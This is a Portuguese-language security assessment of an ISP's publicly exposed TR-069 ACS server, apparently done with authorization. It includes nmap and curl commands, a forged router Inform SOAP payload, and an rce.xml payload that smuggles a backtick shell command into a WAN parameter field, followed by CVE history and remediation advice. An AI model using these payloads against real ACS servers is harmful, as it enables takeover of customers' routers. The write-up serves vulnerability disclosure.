# 🔍 Análise Técnica da Comunicação SOAP e Riscos no ACS (TR-069) - Ambiente ISP Real

📅 **Data da análise:** 03/06/2025  
✍️ **Autor:** Renan Dias Mendes  
🎯 **Objetivo:** Documentar exposição pública e vulnerabilidades técnicas em servidor ACS (TR-069) de ISP real, validando riscos associados à falta de autenticação e controle de acesso em requisições SOAP.

---

## 🧭 Contexto Inicial

- Todos os testes foram realizados com autorização prévia do ISP envolvido.  
- O protocolo TR-069 (CWMP) é utilizado por ISPs para gerenciar remotamente roteadores (CPEs).  
- Um ACS mal configurado pode permitir controle remoto total, execução remota de código (RCE), exfiltração de dados e formação de botnets.  

---

## 🧩 Etapa 0 – Detecção Inicial e Contexto

> **Objetivo:** Investigar exposição pública de servidor ACS (TR-069) acessível externamente via múltiplas portas TCP, sem autenticação ou controle de origem.

- Foi identificado um servidor ACS acessível publicamente, escutando nas portas TCP: `80`, `443`, `7547`, `57547`, `4007` e `3000`.
- O painel aceita requisições SOAP externas arbitrárias, sem exigir autenticação, comportamento incompatível com ambientes de produção seguros.

### 🔴 Riscos Potenciais Identificados

- Controle remoto total dos roteadores afetados  
- Execução remota de código (RCE)  
- Exfiltração de dados pessoais  
- Formação de botnets (ex.: Mirai, Hajime)

---

## 🖥️ Ambiente de Teste

| Item         | Detalhe                                      |
|--------------|----------------------------------------------|
| Host         | VM Kali Linux 2025 1.c                       |
| Interface    | eth0 (modo bridge)                           |
| Rede         | Roteador doméstico ISP                       |
| Ferramentas  | Wireshark, Nmap, curl, XML editor, navegador |

---

## 🛰️ Etapa 1 – Port Scan no IP do Servidor ACS

```bash
sudo nmap -sS -Pn --open -T2 -n -v -p- <IP do ISP>
```
![Scan](prints/1.png)

- Resultado:

![Resultado](prints/2.png)

| Porta     | Estado  | Serviço     |
|-----------|---------|-------------|
| 80/tcp	|  open	  |   http      |
| 443/tcp	|  open	  |   https     |
| 3000/tcp	|  open	  |   ppp       |
| 4007/tcp	|  open	  |   pxc-splr  |
| 7547/tcp	|  open	  |   cwmp      |
| 57547/tcp	|  open	  |   unknown   |

- Portas abertas sem filtragem aparente.
- Portas incomuns indicam possível exposição indevida.

## 🔐 Etapa 2 – Teste Requisição HTTPS na Porta 7547

```bash
curl -k -i https://<IP_do_ISP>:7547/login
```

![Curl Porta 7547](prints/3.png)

Resposta:

- HTTP/1.1 200 OK
- Cookies de sessão e linguagem definidos
- Retorno de HTML funcional (1173437 byte)
- Indícios claros de painel web funcional acessível externamente

## 📄 Etapa 3 – Construção da Requisição SOAP (inform.xml)

Payload XML simulando comunicação legítima do roteador (CPE) com o ACS via CWMP/TR-069.

Eventos simulados: BOOTSTRAP e BOOT.

Inform.XML:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope
    xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
    xmlns:xsd="http://www.w3.org/2001/XMLSchema"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xmlns:cwmp="urn:dslforum-org:cwmp-1-0">
  <SOAP-ENV:Header>
    <cwmp:ID SOAP-ENV:mustUnderstand="1">1234567890</cwmp:ID>
  </SOAP-ENV:Header>
  <SOAP-ENV:Body>
    <cwmp:Inform>
      <DeviceId>
        <Manufacturer>FiberHome</Manufacturer>
        <OUI>000AC2</OUI>
        <ProductClass>HG6145F</ProductClass>
        <SerialNumber>FHGK7CFS0D07</SerialNumber>
      </DeviceId>
      <Event SOAP-ENC:arrayType="cwmp:EventStruct[2]" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/">
        <EventStruct>
          <EventCode>0 BOOTSTRAP</EventCode>
          <CommandKey></CommandKey>
        </EventStruct>
        <EventStruct>
          <EventCode>1 BOOT</EventCode>
          <CommandKey></CommandKey>
        </EventStruct>
      </Event>
      <MaxEnvelopes>1</MaxEnvelopes>
      <CurrentTime>2025-06-11T03:00:00Z</CurrentTime>
      <RetryCount>0</RetryCount>
      <ParameterList SOAP-ENC:arrayType="cwmp:ParameterValueStruct[4]" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/">
        <ParameterValueStruct>
          <Name>InternetGatewayDevice.DeviceInfo.Manufacturer</Name>
          <Value xsi:type="xsd:string">FiberHome</Value>
        </ParameterValueStruct>
        <ParameterValueStruct>
          <Name>InternetGatewayDevice.DeviceInfo.SerialNumber</Name>
          <Value xsi:type="xsd:string">FHGK7CFS0D07</Value>
        </ParameterValueStruct>
        <ParameterValueStruct>
          <Name>InternetGatewayDevice.DeviceInfo.SoftwareVersion</Name>
          <Value xsi:type="xsd:string">RP7123</Value>
        </ParameterValueStruct>
        <ParameterValueStruct>
          <Name>InternetGatewayDevice.DeviceInfo.HardwareVersion</Name>
          <Value xsi:type="xsd:string">WKE2.051.292C02</Value>
        </ParameterValueStruct>
      </ParameterList>
    </cwmp:Inform>
  </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```

## 🚀 Etapa 4 – Envio Manual do SOAP (inform.xml) para ACS porta 7547

```bash
curl -k -X POST https://<IP_do_ISP>/ \
  -H "Content-Type: text/xml; charset=utf-8" \
  --data-binary @inform.xml
```

![Envio inform.xml](prints/5.png)
![Resposta inform.xml](prints/4.png)
Resposta esperada:

```xml
<cwmp:InformResponse><MaxEnvelopes>1</MaxEnvelopes></cwmp:InformResponse>
```

- ACS aceitou a requisição como se fosse um roteador real.
- Indica validação fraca ou inexistente.

## 📡 Etapa 5 – Captura de Tráfego com tcpdump e Wireshark

```bash
sudo tcpdump -i eth0 host <IP_do_ISP> -n -s 0 -w acs_tr069.pcap
```

Foi capturado handshake TLS, payload SOAP e encerramento da sessão.

Apesar do TLS, fluxo e volume da comunicação puderam ser analisados.

![Captura tcpdump](prints/6.png)
![Wireshark](prints/7.png)

## 📊 Etapa 6 – Port Scan Específico e Detalhado

```bash
sudo nmap -sV -p 80,443,3000,4007,57547 <IP_do_ISP>
```

![Novo scan](prints/8.png)

Identificação de versões e serviços ativos nas portas abertas.

![Resultado scan](prints/9.png)

## 📤 Etapa 7 – Análise dos Serviços nas Portas 4007 e 57547

```bash
curl -k -i https://<IP_do_ISP>:4007
curl -k -i http://<IP_do_ISP>:57547
```

- Porta 57547: Painel interno IXC ACS (HTTP, sem TLS) — não acessível via navegador.
![Painel](prints/10.png)

- Porta 4007: API GraphQL Apollo Server (HTTPS)
![Apollo](prints/11.png)


## 📤 Etapa 8 – Teste SOAP na Porta 57547

```bash
curl -k -X POST http://<IP_do_ISP>:57547 \
  -H "Content-Type: text/xml; charset=utf-8" \
  --data-binary @inform.xml
```
![Inform.xml](prints/12.png)

- Comunicação via HTTP em texto plano, dados capturados facilmente via Wireshark.
![Wireshark](prints/13.png)

- Risco crítico de exposição de dados.

## 📄 Etapa 9 – Teste Passivo de RCE via SOAP (rce.xml)

Envio de payload SOAP com comando SetParameterValues simulando injeção de comando ping -c 1 8.8.8.8.

Resposta HTTP 204 (No Content) indica aceitação do comando sem erro.

rce.xml:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope
  xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
  xmlns:xsd="http://www.w3.org/2001/XMLSchema"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xmlns:cwmp="urn:dslforum-org:cwmp-1-0">
  <SOAP-ENV:Header>
    <cwmp:ID SOAP-ENV:mustUnderstand="1">987654321</cwmp:ID>
  </SOAP-ENV:Header>
  <SOAP-ENV:Body>
    <cwmp:SetParameterValues>
      <ParameterList SOAP-ENC:arrayType="cwmp:ParameterValueStruct[1]"
        xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/">
        <ParameterValueStruct>
          <Name>InternetGatewayDevice.WANDevice.1.WANConnectionDevice.1.WANIPConnection.1.Name</Name>
          <Value xsi:type="xsd:string">`ping -c 1 8.8.8.8`</Value>
        </ParameterValueStruct>
      </ParameterList>
      <ParameterKey>rce-test</ParameterKey>
    </cwmp:SetParameterValues>
  </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```

![rce.xml](prints/14.png)
![Wireshark](prints/15.png)

### 🧪 Comportamentos observados:

| Campo Alvo                | Status HTTP retornado     | Observações Técnicas                       |
| --------------------------|---------------------------|--------------------------------------------|
| `.WANIPConnection.1.Name` | `HTTP/1.1 204 No Content` | Payload aceito. Indica parsing e aceitação |

- Aceitação de payloads SOAP arbitrários sem autenticação.
- Padrão similar a múltiplas CVEs históricas de RCE via TR-069.

## 📚 Casos Históricos Relevantes (CVE)

|         CVE        |                              Descrição                                  |   Link  |
|--------------------|-------------------------------------------------------------------------|-------- |
| **CVE-2017-17215** | RCE em roteadores Huawei via TR-069 exposto. Usada em massa pelo Mirai. | [🔗 NVD](https://nvd.nist.gov/vuln/detail/CVE-2017-17215) |
| **CVE-2014-9222**  | Misfortune Cookie – falha crítica em milhões de roteadores.             | [🔗 NVD](https://nvd.nist.gov/vuln/detail/CVE-2014-9222) |
| **CVE-2018-10562** | D-Link vulnerável a execução remota via interface TR-069.               | [🔗 NVD](https://nvd.nist.gov/vuln/detail/CVE-2018-10562) |
| **CVE-2018-20377** | Zhone GPON executando comandos SOAP sem autenticação.                   | [🔗 NVD](https://nvd.nist.gov/vuln/detail/CVE-2018-20377) |

### 🚨 Consequências Potenciais

- Execução remota de código (RCE) via comandos CWMP.
- Comprometimento do ACS para uso como C2 em botnets.
- Automação de ataques em massa contra roteadores dos clientes.
- Riscos legais e regulatórios para o ISP.

## 📛 Conclusão Técnica e Recomendações

A superfície exposta pelo ACS apresenta vulnerabilidades críticas e comportamento alinhado a vetores históricos explorados por botnets como Mirai.

### Recomendações imediatas:

- Remover exposição pública das portas CWMP (7547, 57547).
- Implementar autenticação rigorosa e controle de origem nas requisições SOAP.
- Revisar configurações do servidor Apollo (porta 4007).
- Monitorar e reduzir a superfície de ataque para evitar exploração automatizada.

### 📚 Referências Técnicas

- [CWE-306: Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html)
- [Broadband Forum - TR-069 Technical Library](https://www.broadband-forum.org/technical-library/?search=TR-069)

### 🌐 Links e referências

- [TR-069 Parameters](https://techdocs.audiocodes.com/multi-service-business-routers/mp-5xx/user-manual/version-720/Content/UM/TR-069%20Parameters.htm)
- [Mirai Attacks on TR-069](https://www.qacafe.com/resources/home-router-attack-tr-069-vulnerability/)
- [NVD - CVE-2024-56316](https://nvd.nist.gov/vuln/detail/CVE-2024-56316)
- [Exploit DB Wireless Router](https://www.exploit-db.com/exploits/40740)
- [Cloudshark Capture](https://www.cloudshark.org/captures/5e15ace66abc?filter=dns%20or%20icmp)
- [TR-069 Code Injection Attack](https://www.qacafe.com/resources/2017-01-12-tr-069-code-injection-attack/)
- [NVD - CVE-2017-17215](https://nvd.nist.gov/vuln/detail/CVE-2017-17215#match-14611660)


## 📝 Notas Finais
“Esta análise evidencia riscos críticos em ambientes ISP que utilizam ACS sem autenticação e sem controle rigoroso. A mitigação imediata é essencial para evitar comprometimentos em larga escala.”